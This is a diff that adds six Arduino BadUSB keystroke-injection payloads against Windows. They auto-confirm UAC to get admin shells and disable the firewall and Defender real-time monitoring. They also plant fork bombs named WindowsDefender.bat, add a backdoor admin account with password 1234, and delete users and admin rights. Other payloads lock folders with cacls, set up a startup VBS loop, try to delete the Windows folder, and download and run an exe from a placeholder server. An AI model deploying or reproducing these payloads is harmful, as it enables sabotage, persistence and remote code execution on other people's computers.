@@ -1,0 +1,739 @@
+//payload_1
+#include <Keyboard.h>
+int p1= 7;
+int p2= 15;
+int p3= 14;
+int es1= 0;
+int es2= 0;
+int es3= 0;
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+//////////////////////////////////////
+void setup() {
+  pinMode(p1, INPUT);
+  pinMode(p2, INPUT);
+  pinMode(p3, INPUT);
+}
+//////////////////////////////////////
+void loop() {
+  es1= digitalRead(p1);
+  es2= digitalRead(p2);
+  es3= digitalRead(p3);
+  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
+    pe();
+  }
+  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
+    df();
+    }
+  else if (es1 == LOW && es2 == LOW && es3 == HIGH){
+      qf();
+      }
+}
+//////////////////////////////////////
+void pe() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start/Process cmd /Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.end();
+}
+void df() {
+  //with privilege escalation
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.print("netsh firewall set opmode disable");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.end();
+}
+void qf() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("cmd");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(500);
+  Keyboard.print("cd %USERPROFILE%");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd Documents");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("erase &Q WindowsDefender.bat");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("copy con WindowsDefender.bat");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("%0`%0");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.press(ctrl);
+  Keyboard.press('z');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("WindowsDefender.bat");
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  Keyboard.end();
+}
+
+//payload2
+#include <Keyboard.h>
+int p1= 7;
+int p2= 15;
+int p3= 14;
+int es1= 0;
+int es2= 0;
+int es3= 0;
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+//////////////////////////////////////
+void setup() {
+  pinMode(p1, INPUT);
+  pinMode(p2, INPUT);
+  pinMode(p3, INPUT);
+}
+//////////////////////////////////////
+void loop() {
+  es1= digitalRead(p1);
+  es2= digitalRead(p2);
+  es3= digitalRead(p3);
+  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
+    pe();
+  }
+  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
+    du();
+    }
+  else if (es1 == LOW && es2 == LOW && es3 == HIGH){
+      au();
+      }
+}
+//////////////////////////////////////
+void pe() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start/Process cmd /Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.end();
+}
+void du() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.print("net user %USERNAME% &delete");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.end();
+}
+void au() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.print("net user user1 1234 &add");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("net localgroup administradores user1 &add");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.end();
+}
+
+//payload3
+#include <Keyboard.h>
+int p1= 7;
+int p2= 15;
+int p3= 14;
+int es1= 0;
+int es2= 0;
+int es3= 0;
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+//////////////////////////////////////
+void setup() {
+  pinMode(p1, INPUT);
+  pinMode(p2, INPUT);
+  pinMode(p3, INPUT);
+}
+//////////////////////////////////////
+void loop() {
+  es1= digitalRead(p1);
+  es2= digitalRead(p2);
+  es3= digitalRead(p3);
+  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
+    fs();
+  }
+  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
+    de();
+    }
+  else if (es1 == LOW && es2 == LOW && es3 == HIGH){
+      pe();
+      }
+}
+//////////////////////////////////////
+void fs() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("cmd");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(1000);
+  Keyboard.print("for &l %x in *1,1,10000000000000000000000000000000000000000( do start");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.end();
+}
+void de() {
+  //with privilege escalation and only with english keyboard
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'http://YOURSERVER/FILE'; $file = 'FILE.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.end();
+}
+void pe() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start/Process powershell /Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.end();
+ }
+
+//payload4
+#include <Keyboard.h>
+int p1= 7;
+int p2= 15;
+int p3= 14;
+int es1= 0;
+int es2= 0;
+int es3= 0;
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+char shift= KEY_LEFT_SHIFT;
+//////////////////////////////////////
+void setup() {
+  pinMode(p1, INPUT);
+  pinMode(p2, INPUT);
+  pinMode(p3, INPUT);
+}
+//////////////////////////////////////
+void loop() {
+  es1= digitalRead(p1);
+  es2= digitalRead(p2);
+  es3= digitalRead(p3);
+  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
+    dn();
+  }
+  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
+    dw();
+    }
+  else if (es1 == LOW && es2 == LOW && es3 == HIGH){
+      pe();
+      }
+}
+//////////////////////////////////////
+void dn() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("cmd");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(1000);
+  Keyboard.print("cd %USEPROFILE% ^^ cd Documents");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("erase &Q WindowsDefender.bat");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("copy con WindowsDefender.bat");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("ipconfig &release");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.press(ctrl);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("erase &Q invis.vbs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("copy con invis.vbs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("CreateObject*");
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.print("Wscript.Shell");
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.print("(.Run ");
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.print(" ^ WScript.Arguments*0( ^ ");
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.print(", 0, False");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.press(ctrl);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("wscript.exe invis.vbs WindowsDefender.bat");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.end();
+}
+void dw() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.print("Set/MpPreference /DisableRealtimeMonitoring $true");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(1000);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.end();
+}
+void pe() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start/Process powershell /Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.end();
+}
+
+//payload5
+#include <Keyboard.h>
+int p1= 7;
+int p2= 15;
+int p3= 14;
+int es1= 0;
+int es2= 0;
+int es3= 0;
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+char shift= KEY_LEFT_SHIFT;
+//////////////////////////////////////
+void setup() {
+  pinMode(p1, INPUT);
+  pinMode(p2, INPUT);
+  pinMode(p3, INPUT);
+}
+//////////////////////////////////////
+void loop() {
+  es1= digitalRead(p1);
+  es2= digitalRead(p2);
+  es3= digitalRead(p3);
+  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
+    pf();
+  }
+  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
+    pe();
+    }
+  else if (es1 == LOW && es2 == LOW && es3 == HIGH){
+      dr();
+      }
+}
+//////////////////////////////////////
+void pf() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.print("cd %ProgramData%");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd Microsoft ");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd Windows");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd Start Menu");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd Programs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd Startup");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("erase &Q WindowsDefender.vbs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("copy con WindowsDefender.vbs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("do");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("CreateObject*");
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.print("Wscript.Shell");
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.print("(.Run ");
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.print("cmd");
+  Keyboard.press(shift);
+  Keyboard.press('2');
+  Keyboard.releaseAll();
+  Keyboard.print(", 0, False");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("loop");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.press(ctrl);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("start WindowsDefender.vbs && exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.end();
+}
+void pe() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start/Process cmd /Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.end();
+}
+void dr() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard,print("net localgroup Administradores %USERNAME% &delete");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd.. ");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd..");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd..");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cacls Users &D %USERNAME% ^^ cacls Windows &D %USERNAME%");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("S");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("S");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd %USEPROFILE%");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cacls Desktop &D %USERNAME% ^^ cacls Documents &D %USERNAME% ^^ cacls Pictures &D %USERNAME% ^^ cacls Videos &D %USERNAME%");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("S");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("S");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("S");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("S");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.end();
+}
+
+//payload6
+#include <Keyboard.h>
+int p1= 7;
+int p2= 15;
+int p3= 14;
+int es1= 0;
+int es2= 0;
+int es3= 0;
+char enter= KEY_RETURN;
+char alt= KEY_LEFT_ALT;
+char ctrl= KEY_LEFT_CTRL;
+char shift= KEY_LEFT_SHIFT;
+//////////////////////////////////////
+void setup() {
+  pinMode(p1, INPUT);
+  pinMode(p2, INPUT);
+  pinMode(p3, INPUT);
+}
+//////////////////////////////////////
+void loop() {
+  es1= digitalRead(p1);
+  es2= digitalRead(p2);
+  es3= digitalRead(p3);
+  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
+  pe();
+ }
+  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
+    sb();
+    }
+    else if (es1 == LOW && es2 == LOW && es3 == HIGH){
+	df();
+	}
+}
+//////////////////////////////////////
+void pe() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("powershell Start/Process cmd /Verb runAs");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  delay (12000);
+  Keyboard.press(alt);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.end();
+}
+void sb() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.print("cd..");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd..");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("cd..");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.print("rmdir &S &Q Windows");
+  Keyboard.print("cd..");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(6000);
+  Keyboard.press(ctrl);
+  Keyboard.press('c');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay(100);
+  Keyboard.end();
+}
+void df() {
+  Keyboard.begin();
+  delay(5000);
+  Keyboard.print("netsh advfirewall set currentprofile state off");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.print("exit");
+  Keyboard.press(enter);
+  Keyboard.release(enter);
+  delay (100);
+  Keyboard.end();
+}
